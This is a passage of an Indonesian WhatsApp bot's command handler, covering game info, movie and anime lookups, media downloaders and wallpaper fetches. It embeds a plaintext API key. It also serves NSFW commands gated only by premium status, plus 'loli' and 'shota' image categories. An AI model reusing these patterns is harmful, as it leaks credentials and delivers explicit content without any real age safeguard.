				let charList = characters.map((char, index) => `${index + 1}. 🎮 *${char.name}*\n💬 ${char.desc}\n🔗 Link: https://ff.garena.com/id/chars/${char.id}`).join('\n\n');
				await sock.sendMessage(m.chat, { text: `*Daftar Karakter Free Fire:*\n\n${charList}` }, { quoted: m });
			db.data.users[m.sender].limit -= 1;
			break;
				
			case 'ffcharinfo':
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				let charId = text.split(' ')[1]; // Asumsikan ID karakter setelah kata kunci
				if (!charId) return newReply('⚠️ ID karakter tidak ditemukan!');
				let charDetails = await ffChSkill(charId);
				let charInfo = charDetails.map(detail => `*Judul*: ${detail.title}\n*Name*: ${detail.name}\n*Skill*: ${detail.skill}`).join('\n\n');
				await sock.sendMessage(m.chat, { text: charInfo }, { quoted: m });
			db.data.users[m.sender].limit -= 1;
			break;
				
			case 'ffnews':
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				let news = await ffNews();
				let newsList = news.map(item => `📰 *${item.title}*\n🕒 *${item.time}*\n🔗 Link: ${item.link}`).join('\n\n');
				await sock.sendMessage(m.chat, { text: `*Berita Free Fire Terbaru:*\n\n${newsList}` }, { quoted: m });
			db.data.users[m.sender].limit -= 1;
			break;
				
			case 'ffpets':
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				let pets = await ffPet();
				let petList = pets.map((pet, index) => `${index + 1}. 🐾 *${pet.name}*\n💬 ${pet.talk}\n🔗 Link: https://ff.garena.com/id/pets/${pet.id}`).join('\n\n');
				await sock.sendMessage(m.chat, { text: `*Daftar Pet Free Fire:*\n\n${petList}` }, { quoted: m });
			db.data.users[m.sender].limit -= 1;
			break;
				
			case 'ffpetskill':
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				let petId = text.split(' ')[1]; // Asumsikan ID pet setelah kata kunci
				if (!petId) return newReply('⚠️ ID pet tidak ditemukan!');
				let petDetails = await ffPetSkill(petId);
				let petInfo = petDetails.map(detail => `*Name*: ${detail.name}\n*Skill*: ${detail.skill}`).join('\n\n');
				await sock.sendMessage(m.chat, { text: petInfo }, { quoted: m });
			db.data.users[m.sender].limit -= 1;
			break;
				
			case 'mlstalk': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`⚠️ Gunakan dengan cara: ${prefix + command} *gameId zoneId*\n\n🤔 *Contohnya:*\n\n${prefix + command} 12345 1`);
				const [gameId, zoneId] = text.split(' ');
				try {
					const gameDetail = await mlstalk(gameId, zoneId);
					newReply(`🎮 *Game*: ${gameDetail.userName}\n🛒 *Harga*: ${gameDetail.price || '0'}\n🔗 ${gameDetail.topUpUrl || 'URL tidak ada.'}`);
				} catch (err) {
					console.error(err);
					newReply(`❌ Ada masalah waktu ambil data dari DuniaGames, Kak! Coba lagi nanti ya 🥺`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'imdb': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`🎬 *Judul film atau serialnya mana, Kak?*\n\nContoh:\n${prefix}${command} Inception`);
				try {
					await m.react('⏳');
					let { data } = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${encodeURIComponent(text)}&plot=full`);
					if (data.Response === 'False') {
						return newReply(`❌ *Film atau serial tidak ditemukan!* Coba cek lagi judulnya ya, Kak.`);
					}
					let imdbInfo = `🎬 *Judul*: ${data.Title}\n`;
					imdbInfo += `📅 *Tahun*: ${data.Year}\n`;
					imdbInfo += `⭐ *Rating*: ${data.Rated}\n`;
					imdbInfo += `📆 *Rilis*: ${data.Released}\n`;
					imdbInfo += `⏳ *Durasi*: ${data.Runtime}\n`;
					imdbInfo += `🌀 *Genre*: ${data.Genre}\n`;
					imdbInfo += `👨‍💼 *Sutradara*: ${data.Director}\n`;
					imdbInfo += `✍️ *Penulis*: ${data.Writer}\n`;
					imdbInfo += `👥 *Aktor*: ${data.Actors}\n`;
					imdbInfo += `📖 *Plot*: ${data.Plot}\n`;
					imdbInfo += `🌐 *Bahasa*: ${data.Language}\n`;
					imdbInfo += `🌍 *Negara*: ${data.Country}\n`;
					imdbInfo += `🏆 *Penghargaan*: ${data.Awards}\n`;
					imdbInfo += `💵 *Box Office*: ${data.BoxOffice || '-'}\n`;
					imdbInfo += `🏙️ *Produksi*: ${data.Production || '-'}\n`;
					imdbInfo += `🌟 *IMDb Rating*: ${data.imdbRating}\n`;
					imdbInfo += `✅ *IMDb Votes*: ${data.imdbVotes}\n`;
					await sock.sendMessage(m.chat, {
						image: { url: data.Poster || 'https://via.placeholder.com/300x450?text=No+Poster' },
						caption: imdbInfo,
					}, { quoted: m });
					newReply(`✅ *Berhasil menampilkan informasi film!*`);
				} catch (err) {
					console.error(err);
					newReply(`❌ *Terjadi kesalahan saat mencari film!* 😭\n${err.message || err}`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'gddl':
			case 'gdrivedl':
			case 'gdrive': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`Gunakan dengan cara ${prefix + command} <url>`)
				if (!text.includes('drive')) return newReply('Link nggak valid')
				try {
					const res = await GDriveDl(text);
					if (res.error) return newReply('URL tidak valid, periksa ulang apakah akses ke URL sudah public?')
					sock.sendMessage(m.chat, {
						document: {
							url: res.downloadUrl
						},
						mimetype: res.mimetype,
						fileName: res.fileName,
						caption: `*GOOGLE DRIVE*\n\n*Nama*: ${res.fileName}\n*Size*: ${res.fileSize}\n*Type*: ${res.mimetype}`
					}, {
						quoted: m
					})
				} catch (error) {
					console.log(error);
					newReply('Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.');
				};
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'pinterest': case 'pin': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`Enter Query!`);
				await m.react('⏱️');
				async function createImage(url) {
					const { imageMessage } = await generateWAMessageContent({
						image: {
							url
						}
					}, {
						upload: sock.waUploadToServer
					});
					return imageMessage;
				}
				function shuffleArray(array) {
					for (let i = array.length - 1; i > 0; i--) {
						const j = Math.floor(Math.random() * (i + 1));
						[array[i], array[j]] = [array[j], array[i]];
					}
				}
				let push = [];
				let anutrest = await pinterest(text);
				shuffleArray(anutrest);
				let selectedImages = anutrest.slice(0, 5);
				let i = 1;
				for (let message of selectedImages) {
					push.push({
						body: proto.Message.InteractiveMessage.Body.fromObject({
							text: `👤 *Diunggah oleh*: ${message.upload_by}\n` +
							`📛 *Nama Lengkap*: ${message.fullname}\n` +
							`👥 *Pengikut*: ${message.followers}\n` +
							`📝 *Caption*: ${message.caption}`
						}),
						footer: proto.Message.InteractiveMessage.Footer.fromObject({
							text: footer
						}),
						header: proto.Message.InteractiveMessage.Header.fromObject({
							title: `*Gambar* - ${i++}`,
							hasMediaAttachment: true,
							imageMessage: await createImage(message.image)
						}),
						nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
							buttons: [
								{
									"name": "cta_url",
									"buttonParamsJson": `{
										"display_text": "View Source 👀",
										"url": "${message.source}", 
										"merchant_url": "${message.source}"
									}`
								}
							]
						})
					});
				}
				const msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							messageContextInfo: {
								deviceListMetadata: {},
								deviceListMetadataVersion: 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.fromObject({
								body: proto.Message.InteractiveMessage.Body.create({
									text: mess.done
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: footer
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									hasMediaAttachment: false
								}),
								carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
									cards: [
										...push
									]
								})
							})
						}
					}
				}, { 
					quoted: m 
				});
				await sock.relayMessage(m.chat, msg.message, {
					messageId: msg.key.id
				});
			}
			db.data.users[m.sender].limit -= 1;
			break

			case 'savepin': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`Example: ${prefix + command} https://pin.it/34Gef3SlC`)
				if (!text.includes('pin')) return newReply(`Link Invalid!!`)
				try {
					await m.react('⏱️');
					const res = await savePin(text);
					const { title, results } = res
					let media = results[0]
					let caption = `✨ *Judul*: ${title}\n📥 *Type*: ${media.type}\n📁 *Format*: ${media.format}`
					if (media.format === 'MP4') {
						await sock.sendMessage(m.chat, { caption, video: { url: media.downloadLink } }, { quoted: m })
					} else if (media.format === 'JPG') {
						await sock.sendMessage(m.chat, { caption, image: { url: media.downloadLink } }, { quoted: m })
					} else {
						return newReply('Format media tidak didukung.')
					}
				} catch (err) {
					console.error(err)
					newReply('Terjadi kesalahan saat memproses permintaan.')
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'quoteanime':
			case 'animequote':
			case 'quotesanime': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				try {
					let quotes = await quotesAnime();
					if (!quotes || quotes.length === 0) {
						return newReply(`⚠️ Wah, MiwaAI gak nemu quote anime nih, Kak! Coba lagi nanti ya 🥲`);
					}
					let randomQuote = quotes[Math.floor(Math.random() * quotes.length)];
					await sock.sendMessage(
						m.chat,
						{
							image: { url: randomQuote.gambar },
							caption: `🎌 *Quote Anime* 🎌\n\n` +
							`🗣️ *Karakter*: ${randomQuote.karakter || '-'}\n` +
							`📺 *Anime*: ${randomQuote.anime || '-'}\n` +
							`🎬 *Episode*: ${randomQuote.episode || '-'}\n` +
							`📅 *Diunggah*: ${randomQuote.up_at || '-'}\n\n` +
							`💬 *Quote*: "${randomQuote.quotes || '-'}"\n\n` +
							`🔗 *Sumber*: ${randomQuote.link}`
						},
						{ quoted: m }
					);
				} catch (error) {
					console.error(error);
					await newReply(`❌ Wah, ada kesalahan waktu ambil quote anime nih, Kak! Coba lagi nanti ya 🥺`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'anime': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) {
					return newReply('⚠️ *Judul anime-nya mana, Kak?* Coba ketik nama anime yang mau dicari ya! 🫣');
				}
				const malScraper = require('mal-scraper');
				await newReply('⏳ *Tunggu sebentar ya, MiwaAI lagi cari datanya...* 📚✨');
				const anime = await malScraper.getInfoFromName(text).catch(() => null);
				if (!anime) {
					return newReply('❌ *Yahh, anime yang Kamu cari gak ketemu...* 🥺 Coba ketik judul yang lebih spesifik ya!');
				}
				let animeInfo = `🎀 *《 𝗜𝗡𝗙𝗢 𝗔𝗡𝗜𝗠𝗘 》* 🎀\n\n📚 *Judul*: ${anime.title}\n🎭 *Tipe*: ${anime.type}\n📅 *Tayang Perdana*: ${anime.premiered || '-'}\n🎬 *Total Episode*: ${anime.episodes || '-'}\n📈 *Status*: ${anime.status || '-'}\n💠 *Genre*: ${anime.genres || '-'}\n🏢 *Studio*: ${anime.studios || '-'}\n⭐ *Skor*: ${anime.score || '-'}\n🔖 *Rating*: ${anime.rating || '-'}\n🏅 *Peringkat*: ${anime.ranked || '-'}\n🔥 *Popularitas*: ${anime.popularity || '-'}\n🎥 *Trailer*: ${anime.trailer || '-'}\n🌐 *Link MAL*: ${anime.url || '-'}\n📝 *Deskripsi*: ${anime.synopsis || 'Tidak ada deskripsi tersedia.'}\n\n✨ *Selamat menikmati info animenya, Kak!* 😊🎌`;
				await sock.sendMessage(
					m.chat,
					{ 
						image: { url: anime.picture || imageUrl }, 
						caption: animeInfo 
					},
					{ quoted: m }
				);
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'waifu':
			case 'neko': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				await m.react('⏱️');
				const data = await fetchJson(`https://api.waifu.pics/sfw/${command}`);
				m.reply({
					image: { url: data.url },
					caption: `Nih Kak ${pushname}, ${command}-nya 😋☕`,
					footer: footer,
					buttons: [
						{
							buttonId: prefix + command,
							buttonText: {
								displayText: "🔄 Lanjut Lagi"
							}
						},
						{
							buttonId: `${prefix}menu`,
							buttonText: {
								displayText: "📜 Kembali ke Menu"
							}
						}
					],
					viewOnce: true
				});
			};
			db.data.users[m.sender].limit -= 1;
			break;

			case 'bluearchive':
			case 'randombluearchive': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				await m.react('⏱️');
				const data = await fetchJson(`https://api.siputzx.my.id/api/r/blue-archive`);
				m.reply({
					image: { url: data.url },
					caption: `Nih Kak ${pushname}, Random Blue Archive-nya 😋☕`,
					footer: footer,
					buttons: [
						{
							buttonId: prefix + command,
							buttonText: {
								displayText: "🔄 Lanjut Lagi"
							}
						},
						{
							buttonId: `${prefix}menu`,
							buttonText: {
								displayText: "📜 Kembali ke Menu"
							}
						}
					],
					viewOnce: true
				});
			};
			db.data.users[m.sender].limit -= 1;
			break;

			case 'hwaifu': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				await m.react('⏱️');
				const data = await fetchJson(`https://api.waifu.pics/nsfw/waifu`);
				m.reply({
					image: { url: data.url },
					caption: `⚠️ *Konten NSFW Terdeteksi!* ⚠️\n\nHalo, Kak! Fitur ini berisi konten yang sensitif dan hanya boleh diakses oleh pengguna yang sudah cukup umur. Jangan lupa, kesenangan sesaat nggak boleh bikin lupa waktu dan tanggung jawab, ya! 🫣\n\nGunakan fitur ini dengan bijak dan jangan berlebihan. Ingat, keseimbangan itu penting! 🧠✨`,
					footer: footer,
					buttons: [
						{
							buttonId: prefix + command,
							buttonText: { displayText: "🔄 Lanjut Lagi" }
						},
						{
							buttonId: `${prefix}menu`,
							buttonText: { displayText: "📜 Kembali ke Menu" }
						}
					],
					viewOnce: true
				});
				db.data.users[m.sender].limit -= 1;
			}
			break;

			case 'hneko': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				await m.react('⏱️');
				const data = await fetchJson(`https://api.waifu.pics/nsfw/neko`);
				m.reply({
					image: { url: data.url },
					caption: `⚠️ *Konten NSFW Terdeteksi!* ⚠️\n\nHalo, Kak! Fitur ini berisi konten yang sensitif dan hanya boleh diakses oleh pengguna yang sudah cukup umur. Jangan lupa, kesenangan sesaat nggak boleh bikin lupa waktu dan tanggung jawab, ya! 🫣\n\nGunakan fitur ini dengan bijak dan jangan berlebihan. Ingat, keseimbangan itu penting! 🧠✨`,
					footer: footer,
					buttons: [
						{
							buttonId: prefix + command,
							buttonText: { displayText: "🔄 Lanjut Lagi" }
						},
						{
							buttonId: `${prefix}menu`,
							buttonText: { displayText: "📜 Kembali ke Menu" }
						}
					],
					viewOnce: true
				});
				db.data.users[m.sender].limit -= 1;
			}
			break;

			case 'trap': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				await m.react('⏱️');
				const data = await fetchJson(`https://api.waifu.pics/nsfw/${command}`);
				m.reply({
					image: { url: data.url },
					caption: `⚠️ *Konten NSFW Terdeteksi!* ⚠️\n\nHalo, Kak! Fitur ini berisi konten yang sensitif dan hanya boleh diakses oleh pengguna yang sudah cukup umur. Jangan lupa, kesenangan sesaat nggak boleh bikin lupa waktu dan tanggung jawab, ya! 🫣\n\nGunakan fitur ini dengan bijak dan jangan berlebihan. Ingat, keseimbangan itu penting! 🧠✨`,
					footer: footer,
					buttons: [
						{
							buttonId: prefix + command,
							buttonText: { displayText: "🔄 Lanjut Lagi" }
						},
						{
							buttonId: `${prefix}menu`,
							buttonText: { displayText: "📜 Kembali ke Menu" }
						}
					],
					viewOnce: true
				});
				db.data.users[m.sender].limit -= 1;
			}
			break;

			case 'blowjob': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				await m.react('⏱️');
				const data = await fetchJson(`https://api.waifu.pics/nsfw/${command}`);
				m.reply({
					image: { url: data.url },
					caption: `⚠️ *Konten NSFW Terdeteksi!* ⚠️\n\nHalo, Kak! Fitur ini berisi konten yang sensitif dan hanya boleh diakses oleh pengguna yang sudah cukup umur. Jangan lupa, kesenangan sesaat nggak boleh bikin lupa waktu dan tanggung jawab, ya! 🫣\n\nGunakan fitur ini dengan bijak dan jangan berlebihan. Ingat, keseimbangan itu penting! 🧠✨`,
					footer: footer,
					buttons: [
						{
							buttonId: prefix + command,
							buttonText: { displayText: "🔄 Lanjut Lagi" }
						},
						{
							buttonId: `${prefix}menu`,
							buttonText: { displayText: "📜 Kembali ke Menu" }
						}
					],
					viewOnce: true
				});
				db.data.users[m.sender].limit -= 1;
			}
			break;

			case 'hentai': 
			case 'hentai-video': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				await m.react('⏱️');
				const result = await hentai();
				m.reply({
					video: { url: result[0].video_1 },
					caption: `⚠️ *Konten NSFW Terdeteksi!* ⚠️\n\nHai, Kak! Ingat ya, konten ini ditujukan untuk pengguna yang sudah cukup umur dan harus digunakan dengan penuh kesadaran. Jangan sampai lupa waktu dan tanggung jawab gara-gara konten ini! 🕒💡\n\nKalau udah mulai merasa keterusan, istirahat dulu ya. Kesehatan mental dan fisik tetap nomor satu! 🌟`,
					footer: footer,
					buttons: [
						{
							buttonId: prefix + command,
							buttonText: { displayText: "🔄 Lanjut Lagi" }
						},
						{
							buttonId: `${prefix}menu`,
							buttonText: { displayText: "📜 Kembali ke Menu" }
						}
					],
					viewOnce: true
				});
				db.data.users[m.sender].limit -= 1;
			}
			break;

			case 'wallhp': case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'Husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli2': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu2': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				let data
				if (/akira/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/akira.json')
				if (/akiyama/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/akiyama.json')
				if (/ana/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/ana.json')
				if (/art/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/art.json')
				if (/asuna/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/asuna.json')
				if (/ayuzawa/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/ayuzawa.json')
				if (/boneka/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/boneka.json')
				if (/boruto/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/boruto.json')
				if (/bts/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/bts.json')
				if (/cecan/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/cecan.json')
				if (/chiho/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/chiho.json')
				if (/chitoge/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/chitoge.json')
				if (/cogan/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/cogan.json')
				if (/cosplay/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/cosplay.json')
				if (/cosplayloli/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/cosplayloli.json')
				if (/cosplaysagiri/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/cosplaysagiri.json')
				if (/cyber/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/cyber.json')
				if (/deidara/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/deidara.json')
				if (/doraemon/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/doraemon.json')
				if (/eba/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/eba.json')
				if (/elaina/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/elaina.json')
				if (/emilia/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/emilia.json')
				if (/erza/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/erza.json')
				if (/exo/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/exo.json')
				if (/femdom/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/femdom.json')
				if (/freefire/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/freefire.json')
				if (/gamewallpaper/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/gamewallpaper.json')
				if (/glasses/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/glasses.json')
				if (/gremory/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/gremory.json')
				if (/hacker/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/hekel.json')
				if (/hestia/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/hestia.json')
				if (/Husbu/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/Husbu.json')
				if (/inori/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/inori.json')
				if (/islamic/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/islamic.json')
				if (/isuzu/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/isuzu.json')
				if (/itachi/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/itachi.json')
				if (/itori/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/itori.json')
				if (/jennie/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/jeni.json')
				if (/jiso/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/jiso.json')
				if (/justina/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/justina.json')
				if (/kaga/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/kaga.json')
				if (/kagura/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/kagura.json')
				if (/kakasih/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/kakasih.json')
				if (/kaori/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/kaori.json')
				if (/cartoon/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/kartun.json')
				if (/shortquote/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/kataNya.json')
				if (/keneki/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/keneki.json')
				if (/kotori/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/kotori.json')
				if (/kpop/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/kpop.json')
				if (/kucing/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/kucing.json')
				if (/kurumi/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/kurumi.json')
				if (/lisa/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/lisa.json')
				if (/loli2/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/loli.json')
				if (/madara/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/madara.json')
				if (/megumin/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/megumin.json')
				if (/mikasa/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/mikasa.json')
				if (/mikey/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/mikey.json')
				if (/miku/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/miku.json')
				if (/minato/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/minato.json')
				if (/mobile/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/mobil.json')
				if (/motor/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/motor.json')
				if (/mountain/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/mountain.json')
				if (/naruto/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/naruto.json')
				if (/nekonime/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/nekonime.json')
				if (/nezuko/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/nezuko.json')
				if (/onepiece/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/onepiece.json')
				if (/pentol/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/pentol.json')
				if (/pokemon/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/pokemon.json')
				if (/profil/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/profil.json')
				if (/progamming/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/programming.json')
				if (/pubg/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/pubg.json')
				if (/randblackpink/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/randblackpink.json')
				if (/randomnime/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/randomnime.json')
				if (/randomnime2/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/randomnime2.json')
				if (/rize/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/rize.json')
				if (/rose/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/rose.json')
				if (/ryujin/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/ryujin.json')
				if (/sagiri/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/sagiri.json')
				if (/sakura/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/sakura.json')
				if (/sasuke/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/sasuke.json')
				if (/satanic/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/satanic.json')
				if (/shina/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/shina.json')
				if (/shinka/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/shinka.json')
				if (/shinomiya/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/shinomiya.json')
				if (/shizuka/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/shizuka.json')
				if (/shota/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/shota.json')
				if (/space/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/tatasurya.json')
				if (/technology/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/technology.json')
				if (/tejina/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/tejina.json')
				if (/toukachan/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/toukachan.json')
				if (/tsunade/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/tsunade.json')
				if (/waifu2/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/waifu.json')
				if (/wallhp/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/wallhp.json')
				if (/wallml/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/wallml.json')
				if (/wallmlnime/.test(command)) data = await fetchJson('https://raw.githubusercontent.com/aerovoid4/Media/master/wallnime.json')
